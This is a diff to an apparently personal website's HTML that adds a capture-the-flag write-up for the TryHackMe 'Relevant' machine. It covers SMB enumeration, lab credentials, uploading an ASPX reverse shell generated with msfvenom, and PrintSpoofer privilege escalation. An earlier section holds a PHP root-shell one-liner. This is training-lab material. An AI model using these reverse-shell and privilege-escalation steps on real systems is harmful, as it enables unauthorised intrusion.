@@ -305,6 +305,46 @@
                 <pre><code>/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"</code></pre>
                 <p>This gave a root shell. From there, <code>cd /root</code> to grab the flag.</p>
             </div>
+            <div class="subsection" onclick="toggleSubsection('ctf-relevant')">RELEVANT (TryHackMe)</div>
+            <div id="ctf-relevant" class="subsection-content ctf-content">
+                <h2>Initial Enumeration</h2>
+                <ul>
+                    <li>Found a custom SMB share: <code>nt4wrksv</code></li>
+                    <li>Domain name: <strong>RELEVANT</strong></li>
+                    <li>SMB signing was <strong>disabled</strong></li>
+                    <li>Anonymous and guest access was allowed to the <code>nt4wrksv</code> share</li>
+                </ul>
+            
+                <h2>Credentials Discovered</h2>
+                <ul>
+                    <li>Bob: <code>!P@$$W0rD!123</code> (Low-privilege user)</li>
+                    <li>Bill: <code>Juw4nnaM4n420696969!$$$</code></li>
+                </ul>
+            
+                <p>Only Bob was a valid low-privilege user — others were guest or had no access.</p>
+            
+                <h2>Web Enumeration</h2>
+                <ul>
+                    <li>Performed directory busting on ports <strong>80</strong> and <strong>49663</strong></li>
+                    <li>Discovered <code>nt4wrksv</code> in web directories — linked to SMB share</li>
+                    <li>Confirmed upload access via SMB to the web root</li>
+                </ul>
+            
+                <h2>Exploitation</h2>
+                <p>Uploaded an <strong>ASPX reverse shell</strong> using SMB — ideal for IIS/ASP.NET targets.</p>
+                <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your IP&gt; LPORT=&lt;your port&gt; -f aspx > shell.aspx</code></pre>
+                <p>Triggered the reverse shell through the exposed web path tied to <code>nt4wrksv</code>.</p>
+            
+                <h2>Privilege Escalation</h2>
+                <ul>
+                    <li>Token impersonation attempts failed</li>
+                    <li>Attempted PrintNightmare exploit — caught by AV, even with a custom DLL</li>
+                    <li>Used <strong>PrintSpoofer</strong> successfully — achieved <strong>NT AUTHORITY\SYSTEM</strong></li>
+                </ul>
+            
+                <h2>Conclusion</h2>
+                <p>Compromised the box using a mix of SMB misconfigurations, ASPX shell upload, and PrintSpoofer for privilege escalation.</p>
+            </div>
             <div class="subsection" onclick="toggleSubsection('ctf3')">Coming soon!</div>
             <div id="ctf3" class="subsection-content ctf-content">
                 <p>More CTF write-ups will be added as I complete them. Stay tuned!</p>
